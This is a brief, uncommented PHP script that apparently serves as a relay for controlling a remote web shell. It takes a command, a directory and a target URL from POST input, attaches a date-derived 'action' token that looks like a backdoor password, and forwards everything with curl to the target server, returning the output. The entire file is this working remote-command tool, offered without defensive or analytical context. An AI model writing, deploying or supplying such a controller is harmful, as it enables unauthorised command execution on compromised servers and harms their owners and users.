<?php
  header('Content-Type: application/json');
  if ($_POST['dir']) {
    $dir = $_POST['dir'];
  } else {
    $dir = '/';
  }
  $cmd = $_POST['cmd'];
  $url = $_POST['url'];
  $post_array = array(
    'action' => date('Y_Y_Y_m_d_y'),
    'cmd' => $cmd,
    'dir' => $dir
    );
  if( $curl = curl_init() ) {
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $post_array);
    $out = curl_exec($curl);
    curl_close($curl);
  }
  exit($out);

?>